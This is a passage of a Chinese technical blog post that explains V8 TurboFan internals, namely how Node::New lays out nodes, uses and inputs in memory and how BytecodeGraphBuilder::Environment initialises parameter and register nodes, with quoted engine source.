class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(raw_buffer + capacity * <span class="keyword">sizeof</span>(Use));</span><br><span class="line"></span><br><span class="line">    node = <span class="keyword">new</span> (node_buffer) Node(id, op, input_count, capacity);</span><br><span class="line">    input_ptr = node-&gt;inputs_.inline_;</span><br><span class="line">    use_ptr = <span class="keyword">reinterpret_cast</span>&lt;Use*&gt;(node);</span><br><span class="line">    is_inline = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Initialize the input pointers and the uses.</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> current = <span class="number">0</span>; current &lt; input_count; ++current) &#123;</span><br><span class="line">    Node* to = *inputs++;</span><br><span class="line">    input_ptr[current] = to;</span><br><span class="line">    Use* use = use_ptr - <span class="number">1</span> - current;</span><br><span class="line">    use-&gt;bit_field_ = Use::InputIndexField::encode(current) |</span><br><span class="line">                      Use::InlineField::encode(is_inline);</span><br><span class="line">    to-&gt;AppendUse(use);</span><br><span class="line">  &#125;</span><br><span class="line">  node-&gt;Verify();</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先定义了几个局部变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Node** input_ptr;</span><br><span class="line">Use* use_ptr;</span><br><span class="line">Node* node;</span><br><span class="line"><span class="keyword">bool</span> is_inline;</span><br></pre></td></tr></table></figure><p><strong>然后判断input_count是否大于kMaxInineCapacity</strong><br>注意这里的input_count来自这里的nodes_arr.size()，此处对于start的情况，<code>NewNode(common()-&gt;Start(actual_parameter_count)));</code>，可以看出这个结果是0。<br>这是个比较特殊的情况，后面我们再分析几个node的生成看一下这个逻辑。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Node* <span class="title">NewNode</span><span class="params">(<span class="keyword">const</span> Operator* op, Nodes*... nodes)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">array</span>&lt;Node*, <span class="keyword">sizeof</span>...(nodes)&gt; nodes_arr&#123;&#123;nodes...&#125;&#125;;</span><br><span class="line">  <span class="keyword">return</span> NewNode(op, nodes_arr.<span class="built_in">size</span>(), nodes_arr.data());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么这里有这样的一个比较呢？是因为v8对node的存储决定的<br>从注释里可以找到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D; Memory layout &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;&#x2F;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;&#x2F; Saving space for big graphs is important. We use a memory layout trick to</span><br><span class="line">&#x2F;&#x2F; be able to map &#123;Node&#125; objects to &#123;Use&#125; objects and vice-versa in a</span><br><span class="line">&#x2F;&#x2F; space-efficient manner.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; &#123;Use&#125; links are laid out in memory directly before a &#123;Node&#125;, followed by</span><br><span class="line">&#x2F;&#x2F; direct pointers to input &#123;Nodes&#125;.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; inline case:</span><br><span class="line">&#x2F;&#x2F; |Use #N  |Use #N-1|...|Use #1  |Use #0  |Node xxxx |I#0|I#1|...|I#N-1|I#N|</span><br><span class="line">&#x2F;&#x2F;          ^                              ^                  ^</span><br><span class="line">&#x2F;&#x2F;          + Use                          + Node             + Input</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Since every &#123;Use&#125; instance records its &#123;input_index&#125;, pointer arithmetic</span><br><span class="line">&#x2F;&#x2F; can compute the &#123;Node&#125;.</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; out-of-line case:</span><br><span class="line">&#x2F;&#x2F;     |Node xxxx |</span><br><span class="line">&#x2F;&#x2F;     ^       + outline ------------------+</span><br><span class="line">&#x2F;&#x2F;     +----------------------------------------+</span><br><span class="line">&#x2F;&#x2F;                                         |    |</span><br><span class="line">&#x2F;&#x2F;                                         v    | node</span><br><span class="line">&#x2F;&#x2F; |Use #N  |Use #N-1|...|Use #1  |Use #0  |OOL xxxxx |I#0|I#1|...|I#N-1|I#N|</span><br><span class="line">&#x2F;&#x2F;          ^                                                 ^</span><br><span class="line">&#x2F;&#x2F;          + Use                                             + Input</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F; Out-of-line storage of input lists is needed if appending an input to</span><br><span class="line">&#x2F;&#x2F; a node exceeds the maximum inline capacity.</span><br></pre></td></tr></table></figure><p>如果是小于kMaxInineCapacity，则可以直接将inputs内联在node中。<br>这里的计算方法是，首先计算capacity，默认应该是等于input_count，如果有<code>has_extensible_inputs</code>，则在input_count + 3和kMaxInlineCapacity选取一个最小值。<br><em>这个has_extensible_inputs我还不是很懂，后面看看吧</em></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> capacity = input_count;</span><br><span class="line">    <span class="keyword">if</span> (has_extensible_inputs) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">int</span> <span class="built_in">max</span> = kMaxInlineCapacity;</span><br><span class="line">      capacity = <span class="built_in">std</span>::<span class="built_in">min</span>(input_count + <span class="number">3</span>, <span class="built_in">max</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后计算size大小，并为node和它的use/input分配内存。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> <span class="built_in">size</span> = <span class="keyword">sizeof</span>(Node) + capacity * (<span class="keyword">sizeof</span>(Node*) + <span class="keyword">sizeof</span>(Use));</span><br><span class="line"><span class="keyword">intptr_t</span> raw_buffer = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(zone-&gt;New(<span class="built_in">size</span>));</span><br><span class="line"><span class="keyword">void</span>* node_buffer =</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(raw_buffer + capacity * <span class="keyword">sizeof</span>(Use));</span><br></pre></td></tr></table></figure><p>顺便说一下，一个Use大小是24字节，一个Node是40字节</p><p>计算好size之后进入这个函数，在这生成新的node。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Node::Node(NodeId id, <span class="keyword">const</span> Operator* op, <span class="keyword">int</span> inline_count, <span class="keyword">int</span> inline_capacity)</span><br><span class="line">    : op_(op),</span><br><span class="line">      mark_(<span class="number">0</span>),</span><br><span class="line">      bit_field_(IdField::encode(id) | InlineCountField::encode(inline_count) |</span><br><span class="line">                 InlineCapacityField::encode(inline_capacity)),</span><br><span class="line">      first_use_(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">  <span class="comment">// Inputs must either be out of line or within the inline capacity.</span></span><br><span class="line">  DCHECK_GE(kMaxInlineCapacity, inline_capacity);</span><br><span class="line">  DCHECK(inline_count == kOutlineMarker || inline_count &lt;= inline_capacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后需要为这个node建立input/use关系,这里的逻辑就是，首先根据当前node的input_count数。<br>依次设置to为input节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> current = <span class="number">0</span>; current &lt; input_count; ++current) &#123;</span><br><span class="line">  Node* to = *inputs++;</span><br></pre></td></tr></table></figure><p>然后由于input_ptr指向node的inputs区域，在node的inputs区域记录它的input节点的地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input_ptr = node-&gt;inputs_.inline_;</span><br><span class="line">...</span><br><span class="line">input_ptr[current] = to;</span><br></pre></td></tr></table></figure><p>通过这种方式就将节点的input关系建立好了。<br>然后需要考虑一下use关系，现在我们可以看到use_ptr指向的是当前node的地址。<br>通过use_ptr和{input_index}来计算出use，然后在use里记录当前{input_index}的值，于是我们可以通过这个值来做简单的算数计算来找到node。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Use* use = use_ptr - <span class="number">1</span> - current;</span><br><span class="line">use-&gt;bit_field_ = Use::InputIndexField::encode(current) |</span><br><span class="line">                      Use::InlineField::encode(is_inline);</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">to-&gt;AppendUse(use);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Node::AppendUse</span><span class="params">(Use* use)</span> </span>&#123;</span><br><span class="line">  DCHECK(first_use_ == <span class="literal">nullptr</span> || first_use_-&gt;prev == <span class="literal">nullptr</span>);</span><br><span class="line">  DCHECK_EQ(<span class="keyword">this</span>, *use-&gt;input_ptr());</span><br><span class="line">  use-&gt;next = first_use_;</span><br><span class="line">  use-&gt;prev = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (first_use_) first_use_-&gt;prev = use;</span><br><span class="line">  first_use_ = use;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是从当前节点的input节点到当前节点，这样的一个{input}-&gt;{node}的use关系就建立起来了。<br>注意first_use是Node结构的一个成员变量。</p><p>或许这么说还是有点难懂，其实就是假设有一个节点A，它有0，1，2，3这么几个input节点，0，1，2，3代表的也是input_index。<br>然后对于每一个它的input节点，都要从它的Use部分取一个分配给它的input，如图。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-05-122857.png" alt=""><br>然后因为分配出去的Use里面有记录这个input节点对应的input index，于是很容易就可以计算出来Node的地址。<br>这样，一个{input}-&gt;{node}的{Use #index}的关系就建立好了，而且很容易就可以通过#index来进行算数运算，得到真正的{input}-&gt;{node}，这样的use关系。</p><p><em>之所以需要这么麻烦，可能也是为了让graph IR有SSA的性质……</em></p><p>Node::New结束之后，此时Start节点已经被构建好了，请记住Node::New做的事情，因为后面建立新的node也是通过这个函数来完成的。</p><h4 id="BytecodeGraphBuilder-Environment"><a href="#BytecodeGraphBuilder-Environment" class="headerlink" title="BytecodeGraphBuilder::Environment"></a>BytecodeGraphBuilder::Environment</h4><p>回到<code>BytecodeGraphBuilder::CreateGraph()</code>来看一下，在Start创建之后，初始化env并切换到它。<br>在看env的初始化之前，先看一个重要的class</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The abstract execution environment simulates the content of the interpreter</span></span><br><span class="line"><span class="comment">// register file. The environment performs SSA-renaming of all tracked nodes at</span></span><br><span class="line"><span class="comment">// split and merge points in the control flow.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytecodeGraphBuilder</span>:</span>:Environment : <span class="keyword">public</span> ZoneObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  Environment(BytecodeGraphBuilder* builder, <span class="keyword">int</span> register_count,</span><br><span class="line">              <span class="keyword">int</span> parameter_count,</span><br><span class="line">              interpreter::Register incoming_new_target_or_generator,</span><br><span class="line">              Node* control_dependency);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Specifies whether environment binding methods should attach frame state</span></span><br><span class="line">  <span class="comment">// inputs to nodes representing the value being bound. This is done because</span></span><br><span class="line">  <span class="comment">// the &#123;OutputFrameStateCombine&#125; is closely related to the binding method.</span></span><br><span class="line">  <span class="keyword">enum</span> FrameStateAttachmentMode &#123; kAttachFrameState, kDontAttachFrameState &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">parameter_count</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> parameter_count_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">register_count</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> register_count_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Node* <span class="title">LookupAccumulator</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">LookupRegister</span><span class="params">(interpreter::Register the_register)</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">LookupGeneratorState</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindAccumulator</span><span class="params">(Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                       FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindRegister</span><span class="params">(interpreter::Register the_register, Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                    FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindRegistersToProjections</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      interpreter::Register first_reg, Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">      FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">BindGeneratorState</span><span class="params">(Node* node)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">RecordAfterState</span><span class="params">(Node* node,</span></span></span><br><span class="line"><span class="function"><span class="params">                        FrameStateAttachmentMode mode = kDontAttachFrameState)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Effect dependency tracked by this environment.</span></span><br><span class="line">  <span class="function">Node* <span class="title">GetEffectDependency</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> effect_dependency_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateEffectDependency</span><span class="params">(Node* dependency)</span> </span>&#123;</span><br><span class="line">    effect_dependency_ = dependency;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Preserve a checkpoint of the environment for the IR graph. Any</span></span><br><span class="line">  <span class="comment">// further mutation of the environment will not affect checkpoints.</span></span><br><span class="line">  <span class="function">Node* <span class="title">Checkpoint</span><span class="params">(BailoutId bytecode_offset, OutputFrameStateCombine combine,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Control dependency tracked by this environment.</span></span><br><span class="line">  <span class="function">Node* <span class="title">GetControlDependency</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> control_dependency_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateControlDependency</span><span class="params">(Node* dependency)</span> </span>&#123;</span><br><span class="line">    control_dependency_ = dependency;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Node* <span class="title">Context</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> context_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SetContext</span><span class="params">(Node* new_context)</span> </span>&#123; context_ = new_context; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">Environment* <span class="title">Copy</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(Environment* other, <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">FillWithOsrValues</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PrepareForLoop</span><span class="params">(<span class="keyword">const</span> BytecodeLoopAssignments&amp; assignments,</span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">PrepareForLoopExit</span><span class="params">(Node* loop,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">const</span> BytecodeLoopAssignments&amp; assignments,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">const</span> BytecodeLivenessState* liveness)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Environment</span><span class="params">(<span class="keyword">const</span> Environment* copy)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">StateValuesRequireUpdate</span><span class="params">(Node** state_values, Node** values, <span class="keyword">int</span> count)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateStateValues</span><span class="params">(Node** state_values, Node** values, <span class="keyword">int</span> count)</span></span>;</span><br><span class="line">  <span class="function">Node* <span class="title">GetStateValuesFromCache</span><span class="params">(Node** values, <span class="keyword">int</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">const</span> BitVector* liveness, <span class="keyword">int</span> liveness_offset)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">RegisterToValuesIndex</span><span class="params">(interpreter::Register the_register)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">Zone* <span class="title">zone</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;local_zone(); &#125;</span><br><span class="line">  <span class="function">Graph* <span class="title">graph</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;graph(); &#125;</span><br><span class="line">  <span class="function">CommonOperatorBuilder* <span class="title">common</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_-&gt;common(); &#125;</span><br><span class="line">  <span class="function">BytecodeGraphBuilder* <span class="title">builder</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> builder_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> NodeVector* <span class="title">values</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> &amp;values_; &#125;</span><br><span class="line">  <span class="function">NodeVector* <span class="title">values</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> &amp;values_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">register_base</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> register_base_; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">accumulator_base</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> accumulator_base_; &#125;</span><br><span class="line"></span><br><span class="line">  BytecodeGraphBuilder* builder_;</span><br><span class="line">  <span class="keyword">int</span> register_count_;</span><br><span class="line">  <span class="keyword">int</span> parameter_count_;</span><br><span class="line">  Node* context_;</span><br><span class="line">  Node* control_dependency_;</span><br><span class="line">  Node* effect_dependency_;</span><br><span class="line">  NodeVector values_;</span><br><span class="line">  Node* parameters_state_values_;</span><br><span class="line">  Node* generator_state_;</span><br><span class="line">  <span class="keyword">int</span> register_base_;</span><br><span class="line">  <span class="keyword">int</span> accumulator_base_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>从上面可知，values()返回一个NodeVector values_。<br>然后继续看env的初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function">Environment <span class="title">env</span><span class="params">(<span class="keyword">this</span>, bytecode_array()-&gt;register_count(),</span></span></span><br><span class="line"><span class="function"><span class="params">                  bytecode_array()-&gt;parameter_count(),</span></span></span><br><span class="line"><span class="function"><span class="params">                  bytecode_array()-&gt;incoming_new_target_or_generator_register(),</span></span></span><br><span class="line"><span class="function"><span class="params">                  graph()-&gt;start())</span></span>;</span><br><span class="line">  set_environment(&amp;env);</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  BytecodeGraphBuilder::Environment::Environment(</span><br><span class="line">    BytecodeGraphBuilder* builder, <span class="keyword">int</span> register_count, <span class="keyword">int</span> parameter_count,</span><br><span class="line">    interpreter::Register incoming_new_target_or_generator,</span><br><span class="line">    Node* control_dependency)</span><br><span class="line">    : builder_(builder),</span><br><span class="line">      register_count_(register_count),</span><br><span class="line">      parameter_count_(parameter_count),</span><br><span class="line">      control_dependency_(control_dependency),</span><br><span class="line">      effect_dependency_(control_dependency),</span><br><span class="line">      values_(builder-&gt;local_zone()),</span><br><span class="line">      parameters_state_values_(<span class="literal">nullptr</span>),</span><br><span class="line">      generator_state_(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">  <span class="comment">// The layout of values_ is:</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// [receiver] [parameters] [registers] [accumulator]</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// parameter[0] is the receiver (this), parameters 1..N are the</span></span><br><span class="line">  <span class="comment">// parameters supplied to the method (arg0..argN-1). The accumulator</span></span><br><span class="line">  <span class="comment">// is stored separately.</span></span><br><span class="line">  <span class="comment">// Parameters including the receiver</span></span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意这句话</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parameter[0] is the receiver (this), parameters 1..N are the</span><br><span class="line">Parameters including the receiver</span><br></pre></td></tr></table></figure><p>首先创建parameter节点，Start作为parameter的input节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; parameter_count; i++) &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">const</span> Operator* op = common()-&gt;Parameter(i, debug_name);</span><br><span class="line">  Node* parameter = builder-&gt;graph()-&gt;NewNode(op, graph()-&gt;start());</span><br><span class="line">  values()-&gt;push_back(parameter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后向values_这个NodeVector的end之前，插入register_count个值为undefined_constant的Node节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 